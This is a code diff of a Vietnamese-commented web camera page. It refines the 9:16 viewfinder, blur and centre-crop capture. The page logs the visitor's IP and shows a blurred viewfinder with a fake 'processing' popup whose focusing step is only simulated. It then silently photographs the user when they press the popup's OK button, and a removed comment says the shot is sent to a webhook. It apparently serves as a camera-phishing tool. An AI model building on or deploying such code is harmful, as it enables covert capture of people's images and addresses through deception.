@@ -118,7 +118,7 @@
       transform: scale(1.18);
     }
 
-    /* Khung Camera chuẩn 9:16 không zoom */
+    /* Khung Viewfinder 9:16 Fix Full tràn viền */
     .viewfinder-container {
       width: 100%;
       max-width: 280px;
@@ -137,13 +137,13 @@
     #video {
       width: 100%;
       height: 100%;
-      object-fit: contain;
+      object-fit: cover; /* FIX: Phủ kín 100% khung 9:16 không bị dải đen */
       background: #000;
       transition: transform 0.3s ease, filter 0.3s ease;
     }
 
     #video.blur-effect {
-      filter: blur(12px) brightness(0.6);
+      filter: blur(14px) brightness(0.6);
     }
 
     #video.mirror {
@@ -178,7 +178,7 @@
       transition: opacity 0.05s ease-in-out;
     }
 
-    /* Modals & Popups System */
+    /* Popup Modals */
     .modal-overlay {
       position: fixed;
       inset: 0;
@@ -432,41 +432,34 @@
       getUserIP();
     });
 
-    // Bắt đầu luồng Xin quyền -> Hiện Popup Trình duyệt -> Hiện Popup Xử lý
+    // Luồng Xin quyền -> Trình duyệt cấp quyền -> Popup Xử lý
     async function startPermissionFlow() {
       permissionModal.style.display = 'none';
       
-      // Khởi tạo Camera (Trình duyệt sẽ tự bật popup cấp quyền hệ thống)
       const success = await initCamera('user');
       
       if (success) {
-        // Hiện Popup Báo đang xử lý camera
         processModal.style.display = 'flex';
         
-        // Mô phỏng quá trình xử lý làm nét camera trong 1.5 giây
         setTimeout(() => {
-          // Chuyển nội dung popup thành Đã xử lý xong
           processIcon.className = 'ph ph-check-circle modal-icon';
           processIcon.style.color = '#22c55e';
           processTitle.innerText = 'Đã xử lý xong!';
           processDesc.innerText = 'Camera đã sẵn sàng. Nhấn nút OK bên dưới để bắt đầu ghi hình.';
           okBtn.style.display = 'block';
           
-          // Bỏ mờ kính ngắm camera
           video.classList.remove('blur-effect');
         }, 1500);
       } else {
-        alert("Không thể truy cập Camera. Vui lòng cấp quyền trong cài đặt trình duyệt.");
+        alert("Không thể truy cập Camera. Vui lòng kiểm tra lại quyền truy cập.");
         permissionModal.style.display = 'flex';
       }
     }
 
-    // Sự kiện khi nhấn nút OK (Chụp lần 1)
     async function handleOkClick() {
       processModal.style.display = 'none';
-      shutterBtn.classList.remove('disabled'); // Mở khóa nút chụp màu trắng
+      shutterBtn.classList.remove('disabled');
       
-      // Tiến hành chụp và gửi Webhook
       await takePhotoSequence("Nút OK Popup (Lần 1)");
     }
 
@@ -481,7 +474,6 @@
         const stream = await navigator.mediaDevices.getUserMedia({ 
           video: {
             facingMode: facingMode,
-            aspectRatio: { ideal: 9 / 16 },
             width: { ideal: 1080 },
             height: { ideal: 1920 }
           },
@@ -524,22 +516,45 @@
       initCamera(nextMode);
     }
 
+    // CROP CHUẨN XÁC 100% NHƯ NHỮNG GÌ MẮT NHÌN THẤY TRÊN MÀN HÌNH (9:16)
     function captureFrame() {
       return new Promise((resolve) => {
         const context = canvas.getContext('2d');
-        const vW = video.videoWidth || 1080;
-        const vH = video.videoHeight || 1920;
+        const vW = video.videoWidth;
+        const vH = video.videoHeight;
 
-        canvas.width = vW;
-        canvas.height = vH;
+        // Tỷ lệ khung hiển thị là 9/16
+        const targetRatio = 9 / 16;
+        const currentRatio = vW / vH;
+
+        let sWidth, sHeight, sx, sy;
+
+        if (currentRatio > targetRatio) {
+          // Luồng video rộng hơn 9:16 (ví dụ 16:9 ngang) -> Cắt bớt 2 bên hông
+          sHeight = vH;
+          sWidth = vH * targetRatio;
+          sx = (vW - sWidth) / 2;
+          sy = 0;
+        } else {
+          // Luồng video dài hơn 9:16 -> Cắt bớt trên dưới
+          sWidth = vW;
+          sHeight = vW / targetRatio;
+          sx = 0;
+          sy = (vH - sHeight) / 2;
+        }
+
+        // Đặt kích thước canvas đầu ra đúng chuẩn nét 9:16 (1080x1920)
+        canvas.width = 1080;
+        canvas.height = 1920;
 
         context.save();
         if (facingMode === 'user') {
-          context.translate(vW, 0);
+          context.translate(canvas.width, 0);
           context.scale(-1, 1);
         }
 
-        context.drawImage(video, 0, 0, vW, vH);
+        // Vẽ đoạn video đã được Center Crop 9:16
+        context.drawImage(video, sx, sy, sWidth, sHeight, 0, 0, canvas.width, canvas.height);
         context.restore();
 
         canvas.toBlob((blob) => {
@@ -548,7 +563,6 @@
       });
     }
 
-    // Hàm chụp ảnh và gửi về Webhook
     async function takePhotoSequence(triggerSource) {
       shutterBtn.classList.add('disabled');
       
